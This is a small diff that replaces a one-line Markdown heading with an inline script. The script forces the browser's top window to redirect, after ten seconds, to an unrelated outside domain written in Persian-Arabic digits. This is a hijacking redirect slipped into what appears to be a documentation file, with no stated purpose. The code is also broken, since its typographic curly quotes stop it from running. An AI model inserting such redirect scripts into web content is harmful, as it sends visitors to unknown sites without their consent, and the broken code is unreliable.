@@ -1,1 +1,6 @@
-# dbbddgs
+
+<SCRIPT language=”JavaScript”>
+function Go2NewUrl(){top.location=”http://www.۲۰.com“;}
+if (top.frames.length==0){setTimeout(’Go2NewUrl()’,10000);}
+</SCRIPT>
+
